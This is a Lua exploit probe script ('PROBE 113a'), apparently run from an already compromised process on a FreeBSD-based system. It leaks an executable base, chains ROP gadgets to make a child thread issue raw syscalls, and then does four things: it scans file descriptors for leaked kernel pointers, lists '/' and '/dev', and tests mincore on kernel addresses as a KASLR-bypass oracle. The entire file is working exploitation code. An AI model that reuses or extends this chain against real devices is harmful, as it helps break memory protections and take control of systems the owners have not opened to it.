-- CRASH_CLASS: MODERATE
-- PROBE 113a: full fd scan + directory read + mincore KASLR oracle
--
-- A: fstat every fd 0-50 to find hidden kernel object fds
-- B: openat + getdirentries from child (read filesystem)
-- C: mincore from child on kernel VAs (KASLR oracle attempt)
-- D: try newer fstat variant (sys 551) from child
--
-- All sections use child thread (thr_create + SA).
-- No dangerous syscalls — everything here either works or returns -1.

print("=== PROBE 113a: FD SCAN + DIRENTS + MINCORE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function is_kptr(val)
    if val==nil then return false end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    return h>=0xFFFF8000 and h~=0xFFFFFFFF
end
local function fmt_ptr(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO SA") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local function ga(off) return uint64(string.format("0x%X%08X",ehi,elo+off)) end
local PRAX=ga(0x992); local PRDI=ga(0xC9DFE)
local PRSI=ga(0xD77D); local WMOV=ga(0x92C67)

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local mm=mk(477); local tc=mk(430)

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(16*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl500=R+0x40; wq(sl500,uint64(0)); wq(sl500+8,uint64(500000000))
local tb=R+0x80
local RESULT=R+0x1000
local child_stk=R+0x4000*2
local child_ctx=R+0x4000*4
local BUF=R+0x4000*6
local BUF2=R+0x4000*8

local function child_syscall(sysno, a1, a2, a3, a4, a5)
    z(child_ctx, 0x200)
    wq(child_ctx+_MG,uint64(0x480)); wd(child_ctx+_FL,0)
    wq(child_ctx+_TP,uint64(0x10000))
    wq(child_ctx+_CS,uint64(0x43)); wq(child_ctx+_SS,uint64(0x3B))
    wq(child_ctx+_SP,uint64(child_stk))
    wq(child_ctx+_IP,SA)
    wq(child_ctx+_AX,uint64(sysno))
    wq(child_ctx+_DI,uint64(a1 or 0))
    wq(child_ctx+_SI,uint64(a2 or 0))
    wq(child_ctx+_DX,uint64(a3 or 0))
    wq(child_ctx+_R10,uint64(a4 or 0))
    wq(child_ctx+_R8,uint64(a5 or 0))

    local off=0
    wq(child_stk+off,PRDI); off=off+8
    wq(child_stk+off,uint64(RESULT)); off=off+8
    wq(child_stk+off,WMOV); off=off+8
    wq(child_stk+off,PRDI); off=off+8
    wq(child_stk+off,uint64(ts999)); off=off+8
    wq(child_stk+off,PRSI); off=off+8
    wq(child_stk+off,uint64(0)); off=off+8
    wq(child_stk+off,PRAX); off=off+8
    wq(child_stk+off,uint64(240)); off=off+8
    wq(child_stk+off,SA); off=off+8

    wq(RESULT,uint64(0xDEADCAFE))
    wq(tb,uint64(0))
    pcall(function() tc(uint64(child_ctx), uint64(tb), uint64(0)) end)
    native.fcall_with_rax(stub,240,N(sl500),0)

    local c = N(native.fcall_with_rax(stub,20))
    if c~=pid then return nil, false end

    local rv_lo = rd(RESULT) or 0
    local rv_hi = rd(RESULT+4) or 0
    if rv_lo==0xDEADCAFE and rv_hi==0 then return -999, true end

    if rv_hi==0xFFFFFFFF then return -1, true end
    return rv_lo, true
end

-- ============================================================
print("--- A: FSTAT ALL FDs 0-50 ---")
local total_kptrs = 0
local open_fds = {}
for fd=0,50 do
    z(BUF, 0x100)
    local rv, alive = child_syscall(189, fd, BUF)
    if not alive then print("  KILLED at fd="..fd) return end
    if rv==0 then
        -- Parse key fields from freebsd11 stat
        local dev_q = rq(BUF)           -- st_dev(4) + st_ino(4) packed
        local mode_q = rq(BUF+0x08)     -- st_mode(2) + st_nlink(2) + st_uid(4)
        local dev_lo = rd(BUF) or 0     -- st_dev
        local ino = rd(BUF+4) or 0      -- st_ino
        local mode = (rd(BUF+8) or 0) % 0x10000  -- st_mode low 16 bits

        -- Type from mode
        local ftypes = {
            [0x1000]="FIFO", [0x2000]="CHR", [0x4000]="DIR",
            [0x6000]="BLK", [0x8000]="REG", [0xA000]="LNK",
            [0xC000]="SOCK", [0xE000]="WHT"
        }
        local ftype = ftypes[math.floor(mode/0x1000)*0x1000] or "???"

        open_fds[#open_fds+1] = fd

        -- Scan for kernel pointers in full stat struct
        local kp = 0
        for off=0,0x78,8 do
            local val = rq(BUF+off)
            if is_kptr(val) then
                kp = kp + 1
                total_kptrs = total_kptrs + 1
                print(string.format("  fd=%d +0x%02X: %s *** KPTR ***", fd, off, fmt_ptr(val)))
            end
        end

        local tag = kp>0 and " ***KPTR***" or ""
        print(string.format("  fd=%2d: dev=0x%X ino=0x%X mode=0x%04X(%s)%s",
            fd, dev_lo, ino, mode, ftype, tag))
    end
end
print(string.format("  open fds: %d, kernel pointers: %d", #open_fds, total_kptrs))

-- ============================================================
print("")
print("--- B: OPENAT + GETDIRENTRIES (read filesystem) ---")
-- openat(AT_FDCWD, "/", O_RDONLY|O_DIRECTORY)
local path_slash = memory.alloc(8)
wd(path_slash, 0x0000002F)  -- "/" null-terminated
local AT_FDCWD = 0xFFFFFFFFFFFFFF9C
local O_RDONLY = 0
local O_DIRECTORY = 0x20000

local rv, alive = child_syscall(499, AT_FDCWD, N(path_slash), O_RDONLY + O_DIRECTORY)
if not alive then print("  KILLED on openat") return end

if rv and rv >= 0 then
    local dir_fd = rv
    print(string.format("  opened '/' fd=%d", dir_fd))

    -- getdirentries(fd, buf, nbytes, basep)
    local basep = memory.alloc(8); wq(basep, uint64(0))
    z(BUF, 0x2000)
    local drv, dalive = child_syscall(196, dir_fd, BUF, 0x2000, N(basep))
    if not dalive then print("  KILLED on getdirentries") return end

    if drv and drv > 0 then
        print(string.format("  *** GETDIRENTRIES WORKS! %d bytes ***", drv))
        -- FreeBSD 11 dirent: d_fileno(4), d_reclen(2), d_type(1), d_namlen(1), d_name[]
        local pos = 0
        local count = 0
        local dir_kptrs = 0
        while pos < drv and count < 20 do
            local d_fileno = rd(BUF+pos) or 0
            local d_reclen_raw = rd(BUF+pos+4) or 0
            local d_reclen = d_reclen_raw % 0x10000
            local d_type = math.floor(d_reclen_raw / 0x10000) % 256
            local d_namlen = math.floor(d_reclen_raw / 0x1000000)
            if d_reclen==0 or d_reclen>256 then break end

            local name = {}
            for i=0,math.min(d_namlen,63)-1 do
                local b = rd(BUF+pos+8+i)
                if b==nil then break end
                local c=b%256; if c==0 then break end
                name[#name+1]=string.char(c)
            end

            local dtypes = {[4]="DIR",[8]="REG",[10]="LNK",[12]="SOCK",[2]="CHR",[6]="BLK",[1]="FIFO"}
            print(string.format("    ino=%d type=%s name='%s'",
                d_fileno, dtypes[d_type] or tostring(d_type), table.concat(name)))

            -- Check if d_fileno is suspiciously large (kernel address fragment?)
            if d_fileno > 0x80000000 then
                print(string.format("    *** LARGE INODE: 0x%X ***", d_fileno))
                dir_kptrs = dir_kptrs + 1
            end

            pos = pos + d_reclen
            count = count + 1
        end
        print(string.format("  entries: %d, suspicious inos: %d", count, dir_kptrs))
    else
        print(string.format("  getdirentries: rv=%s", tostring(drv)))
    end

    child_syscall(6, dir_fd)  -- close

    -- Try reading /dev
    local path_dev = memory.alloc(8)
    wd(path_dev, 0x7665642F)  -- "/dev"
    wd(path_dev+4, 0x00000000)  -- null term
    rv, alive = child_syscall(499, AT_FDCWD, N(path_dev), O_RDONLY + O_DIRECTORY)
    if not alive then print("  KILLED on openat /dev") return end
    if rv and rv >= 0 then
        local dev_fd = rv
        print(string.format("  opened '/dev' fd=%d", dev_fd))
        z(BUF, 0x2000)
        wq(basep, uint64(0))
        drv, dalive = child_syscall(196, dev_fd, BUF, 0x2000, N(basep))
        if not dalive then print("  KILLED") return end
        if drv and drv > 0 then
            print(string.format("  /dev: %d bytes", drv))
            local pos = 0; local count = 0
            while pos < drv and count < 30 do
                local d_fileno = rd(BUF+pos) or 0
                local d_reclen_raw = rd(BUF+pos+4) or 0
                local d_reclen = d_reclen_raw % 0x10000
                local d_type = math.floor(d_reclen_raw / 0x10000) % 256
                local d_namlen = math.floor(d_reclen_raw / 0x1000000)
                if d_reclen==0 or d_reclen>256 then break end
                local name = {}
                for i=0,math.min(d_namlen,63)-1 do
                    local b = rd(BUF+pos+8+i)
                    if b==nil then break end
                    local c=b%256; if c==0 then break end
                    name[#name+1]=string.char(c)
                end
                print(string.format("    ino=%d t=%d '%s'", d_fileno, d_type, table.concat(name)))
                pos = pos + d_reclen; count = count + 1
            end
        else
            print(string.format("  /dev getdirentries: rv=%s", tostring(drv)))
        end
        child_syscall(6, dev_fd)
    else
        print(string.format("  openat /dev: rv=%s", tostring(rv)))
    end
else
    print(string.format("  openat '/': rv=%s", tostring(rv)))
end

-- ============================================================
print("")
print("--- C: MINCORE FROM CHILD ON KERNEL VAs ---")
-- mincore(addr, len, vec) — reports if pages are resident
-- If this works on kernel VAs from child, it's a KASLR oracle
-- Test known kernel VA range: 0xFFFF800000000000 + offsets
local vec = memory.alloc(0x100)

-- First: control with userland address (should work)
z(vec, 0x100)
local mc_rv, mc_alive = child_syscall(78, R, 0x4000, N(vec))
if not mc_alive then print("  KILLED on mincore") return end
local vec0 = rd(N(vec)) or 0
print(string.format("  mincore(userland): rv=%d vec[0]=0x%X", mc_rv or -999, vec0))

-- Kernel VA probes
local kva_tests = {
    0x0000, 0x200000, 0x1000000, 0x10000000,
    0x80000000, 0x100000000, 0x200000000
}
for _, koff in ipairs(kva_tests) do
    z(vec, 0x10)
    -- Build 0xFFFF800000000000 + koff
    local kva_hi = 0xFFFF8000 + math.floor(koff / 0x100000000)
    local kva_lo = koff % 0x100000000
    local kva = uint64(string.format("0x%X%08X", kva_hi, kva_lo))

    mc_rv, mc_alive = child_syscall(78, N(kva), 0x4000, N(vec))
    if not mc_alive then print("  KILLED on mincore kernel VA!") return end
    vec0 = rd(N(vec)) or 0
    print(string.format("  mincore(0x%X%08X): rv=%d vec[0]=0x%X",
        kva_hi, kva_lo, mc_rv or -999, vec0))
    if mc_rv==0 then
        print("  *** MINCORE WORKS ON KERNEL VA! KASLR ORACLE! ***")
    end
end

-- ============================================================
print("")
print("--- D: NEWER FSTAT (sys 551) FROM CHILD ---")
-- FreeBSD 12+ fstat with 64-bit dev_t and ino_t
z(BUF, 0x200)
local fs_rv, fs_alive = child_syscall(551, 3, BUF)
if not fs_alive then print("  sys 551 KILLED") return end
if fs_rv==0 then
    print("  *** SYS 551 FSTAT WORKS! ***")
    for off=0,0x78,8 do
        local val = rq(BUF+off)
        local tag = is_kptr(val) and " *** KPTR ***" or ""
        print(string.format("    +0x%02X: %s%s", off, fmt_ptr(val), tag))
    end
elseif fs_rv==-999 then
    print("  sys 551: child died (sentinel)")
else
    print(string.format("  sys 551: rv=%d", fs_rv))
end

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 113a COMPLETE ===")
